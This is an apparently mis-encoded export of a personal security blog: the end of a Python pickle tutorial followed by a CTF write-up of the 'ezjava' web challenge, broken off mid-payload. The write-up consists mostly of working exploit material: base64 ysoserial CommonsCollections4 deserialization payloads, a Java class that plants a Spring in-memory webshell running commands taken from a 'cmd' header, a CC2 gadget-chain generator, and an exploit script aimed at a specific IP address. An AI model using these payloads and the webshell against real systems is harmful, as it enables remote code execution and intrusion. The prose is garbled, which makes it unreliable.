<td>å½“å®šä¹‰æ‰©å±•ç±»å‹æ—¶ï¼ˆä¹Ÿå°±æ˜¯ä½¿ç”¨Pythonçš„Cè¯­è¨€APIå®ç°çš„ç±»å‹ï¼‰ï¼Œå¦‚æœä½ æƒ³pickleå®ƒä»¬ï¼Œä½ å¿…é¡»å‘Šè¯‰Pythonå¦‚ä½•pickleå®ƒä»¬ã€‚ <strong>reduce</strong> è¢«å®šä¹‰ä¹‹åï¼Œå½“å¯¹è±¡è¢«Pickleæ—¶å°±ä¼šè¢«è°ƒç”¨ã€‚å®ƒè¦ä¹ˆè¿”å›ä¸€ä¸ªä»£è¡¨å…¨å±€åç§°çš„å­—ç¬¦ä¸²ï¼ŒPyhtonä¼šæŸ¥æ‰¾å®ƒå¹¶pickleï¼Œè¦ä¹ˆè¿”å›ä¸€ä¸ªå…ƒç»„ã€‚è¿™ä¸ªå…ƒç»„åŒ…å«2åˆ°5ä¸ªå…ƒç´ ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼šä¸€ä¸ªå¯è°ƒç”¨çš„å¯¹è±¡ï¼Œç”¨äºé‡å»ºå¯¹è±¡æ—¶è°ƒç”¨ï¼›ä¸€ä¸ªå‚æ•°å…ƒç´ ï¼Œä¾›é‚£ä¸ªå¯è°ƒç”¨å¯¹è±¡ä½¿ç”¨ï¼›è¢«ä¼ é€’ç»™ <strong>setstate</strong> çš„çŠ¶æ€ï¼ˆå¯é€‰ï¼‰ï¼›ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„åˆ—è¡¨å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰ï¼›ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„å­—å…¸å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰</td>
</tr>
</tbody></table>
<p><strong>ç®€å•è¿ç”¨</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> _pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    age = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.name = <span class="string">&#x27;ameuu&#x27;</span></span><br><span class="line">        self.age = <span class="number">18</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è¿™æ˜¯æ„é€ æ–¹æ³•&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è¿™æ˜¯ææ„æ–¹æ³•&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;å¯¹è±¡è¢«å½“ä½œå‡½æ•°è°ƒç”¨&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span>(<span class="params">self, item</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è°ƒç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        student = Person()</span><br><span class="line">        <span class="comment"># pop = base64.b64encode(_pickle.dumps(student))</span></span><br><span class="line">        <span class="comment"># print(pop)</span></span><br><span class="line">        student()</span><br><span class="line">        student.a</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>Pickle</code>çš„<code>dumps</code>å’Œ<code>loads</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> _pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    name: <span class="string">&quot;admin&quot;</span></span><br><span class="line">    is_admin: <span class="number">0</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(_pickle.dumps(User()))</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(_pickle.dumps(User())))</span><br><span class="line">usr = _pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(_pickle.loads(usr))</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>æ²¡æœ‰äººæ¯”æˆ‘æ›´çˆ±å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>è¯­è¨€å­¦ä¹ </tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¥¥äº‘æ¯ web</title>
    <url>/2022/10/31/%E7%A5%A5%E4%BA%91%E6%9D%AF-web/</url>
    <content><![CDATA[<h3 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h3><p>ä¸‹è½½é™„ä»¶å®¡è®¡</p>
<p>æœ‰ä¸¤ä¸ªè·¯ç”±helloå’ŒmyTestï¼Œåœ¨myTestå‡ºç›´æ¥postä¼ payloadï¼Œç„¶åè¿›è¡Œæ— é™åˆ¶çš„ååºåˆ—åŒ–ã€‚æŸ¥çœ‹ä¸€ä¸‹libå‘ç°æœ‰commons-collections4.0ä¾èµ–ï¼Œè¿™å°±å¾ˆå®¹æ˜“æƒ³åˆ°CC2æˆ–CC4é“¾ï¼Œç›´æ¥ç”¨ysoç”Ÿæˆpayloadè¿›è¡Œåå¼¹shellã€‚è¿™é‡Œå¯èƒ½æ˜¯ç”±äºä¸€äº›ç‰¹æ®Šå­—ç¬¦ç›´æ¥hackbarä¼ æ²¡æœ‰ç”¨ï¼Œæ‰€ä»¥ç”¨pythonä¼ ï¼Œä½†æ˜¯æ²¡æœ‰åå¼¹æˆåŠŸ</p>
<p>æœ¬åœ°æµ‹è¯•ä¸€ä¸‹payloadå¯¹ä¸å¯¹</p>
<p>jdk8u66</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ezjava-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•çš„payloadï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAObmV3VHJhbnNmb3JtZXJ1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgALTAAFX25hbWVxAH4ACkwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAGmsr+ur4AAAA0ADkKAAMAIgcANwcAJQcAJgEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQATU3R1YlRyYW5zbGV0UGF5bG9hZAEADElubmVyQ2xhc3NlcwEANUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAKAEAM3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAqAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwALAAtCgArAC4BAARjYWxjCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyMTg4MjQ4NzA4NzA4NzAwAQAgTHlzb3NlcmlhbC9Qd25lcjE4ODI0ODcwODcwODcwMDsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABgAAAHUyv66vgAAADQAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABeA==</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/b22600417f2b4110b4b1b863d890125a.png" alt="Untitled"></p>
<p>æœ¬åœ°windowsç¯å¢ƒä¸‹payloadæµ‹è¯•æˆåŠŸï¼Œå› ä¸ºä¸ä¿¡é‚ªè‡ªå·±è¿˜æ­äº†ä¸€ä¸ªdockerç¯å¢ƒæ”¾åˆ°äº‘æœåŠ¡å™¨ä¸Šï¼Œå‘ç°åå¼¹shellä¹Ÿæ˜¯æˆåŠŸäº†çš„ï¼Œè¯´æ˜åªæœ‰ä¸€ç§å¯èƒ½å°±æ˜¯é¢˜ç›®ä¸èƒ½å‡ºç½‘ï¼Œè¿™æ ·ä¸€ä¸‹å­å°±å¾ˆéš¾åŠäº†</p>
<p>æœ€åç»è¿‡å„ç§ä¿¡æ¯æœé›†ï¼Œå‘ç°å¯ä»¥åˆ©ç”¨Springå†…å­˜é©¬è¿›è¡Œå›æ˜¾</p>
<p><a href="http://www.bmth666.cn/bmth_blog/2022/09/27/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/#Spring%E5%86%85%E5%AD%98%E9%A9%AC">http://www.bmth666.cn/bmth_blog/2022/09/27/Springå†…å­˜é©¬å­¦ä¹ /#Springå†…å­˜é©¬</a></p>
<p><a href="https://www.anquanke.com/post/id/258575#h2-2">https://www.anquanke.com/post/id/258575#h2-2</a></p>
<p><a href="https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/">https://myzxcg.com/2021/11/Spring-å†…å­˜é©¬å®ç°/</a></p>
<p>ç›´æ¥æ‹¿ä»ä¸‡èƒ½çš„ç½‘ç»œä¸­æ‰¾åˆ°çš„æ¶æ„ç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads.evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilTest</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilTest</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">        Method m = c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">        Object o = m.invoke(<span class="keyword">null</span>);</span><br><span class="line">        c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">        m = c.getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">        Method m1 = c.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">        Object resp = m.invoke(o);</span><br><span class="line">        Object req = m1.invoke(o); <span class="comment">// HttpServletRequest</span></span><br><span class="line">        Method getWriter = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">        Method getHeader = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class="string">&quot;getHeader&quot;</span>,String.class);</span><br><span class="line">        getHeader.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        getWriter.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object writer = getWriter.invoke(resp);</span><br><span class="line">        String cmd = (String)getHeader.invoke(req, <span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        String[] commands = <span class="keyword">new</span> String[<span class="number">3</span>];</span><br><span class="line">        String charsetName = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;window&quot;</span>) ? <span class="string">&quot;GBK&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="string">&quot;WIN&quot;</span>))&#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;/c&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        commands[<span class="number">2</span>] = cmd;</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="keyword">new</span> Scanner(Runtime.getRuntime().exec(commands).getInputStream(), charsetName).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next());</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;flush&quot;</span>).invoke(writer);</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;close&quot;</span>).invoke(writer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>CC2:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj,String fieldname,Object value)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//åˆ›å»ºTemplatesImplå¯¹è±¡åŠ è½½å­—èŠ‚ç </span></span><br><span class="line">        <span class="keyword">byte</span>[] code = ClassPool.getDefault().get(<span class="string">&quot;ysoserial.payloads.evil.EvilTest&quot;</span>).toBytecode();</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;ameuu&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ›å»ºTranformingComparator å®ä¾‹</span></span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;toString&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ›å»º PriorityQueue å®ä¾‹</span></span><br><span class="line">        <span class="comment">//readobject å…¥å£</span></span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>,transformingComparator);</span><br><span class="line">        priorityQueue.add(obj);</span><br><span class="line">        priorityQueue.add(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä¿®æ”¹è°ƒç”¨æ–¹æ³•ä¸ºnewTransformerï¼ŒåŠ è½½æ¶æ„ç±»ã€‚</span></span><br><span class="line">        setFieldValue(transformer,<span class="string">&quot;iMethodName&quot;</span>,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baor = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baor);</span><br><span class="line">        oos.writeObject(priorityQueue);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(Base64.getEncoder().encode(baor.toByteArray())));</span><br><span class="line"></span><br><span class="line"><span class="comment">//        //ååºåˆ—åŒ–</span></span><br><span class="line"><span class="comment">//        ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());</span></span><br><span class="line"><span class="comment">//        ObjectInputStream ois = new ObjectInputStream(bais);</span></span><br><span class="line"><span class="comment">//        Object o = ois.readObject();</span></span><br><span class="line"><span class="comment">//        baor.close();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pythonä¸Šä¼ ï¼Œè¿™é‡Œå…¶å®ä¹Ÿå¡äº†å¾ˆä¹…ï¼Œç›´æ¥ä¸Šä¼ çš„æ—¶å€™ç›´æ¥å›æ˜¾500ç„¶åå†å»è¯·æ±‚å¤´æ·»åŠ cmdä¹‹åå¹¶æ²¡æœ‰æ‰§è¡Œï¼Œæ„Ÿè§‰æ˜¯æ²¡æœ‰æˆåŠŸï¼Œç›´åˆ°åæ¥åœ¨è‡ªå·±æµ‹è¯•çš„æ—¶å€™ç›´æ¥dataå’Œheadersä¸€èµ·ä¼ å‘ç°å±…ç„¶æˆåŠŸäº†ï¼Œä¸æ˜¯å¾ˆèƒ½ç†è§£ï¼ˆè¿˜æ˜¯å¤ªèœäº†</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://39.106.13.71:18962/myTest&#x27;</span></span><br><span class="line">data = <span class="string">&#x27;rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHBwdAAObmV3VHJhbnNmb3JtZXJwdwQAAAADc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3NxAH4AC0wABV9uYW1lcQB+AApMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAADnPK/rq+AAAANAC5CgAvAF8KAGAAYQoAYABiCABjCgBkAGUIAGYHAGcKAAcAaAcAaQoAagBrCABsCABtCABuCABvCABNCgAHAHAIAHEIAE4HAHIKAGoAcwgAUAgAdAoAdQB2CgATAHcIAHgKABMAeQgAeggAewoAEwB8CAB9CAB+CAB/CACACgAJAIEIAIIHAIMKAIQAhQoAhACGCgCHAIgKACQAiQgAigoAJACLCgAkAIwIAI0IAI4HAI8HAJABAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaW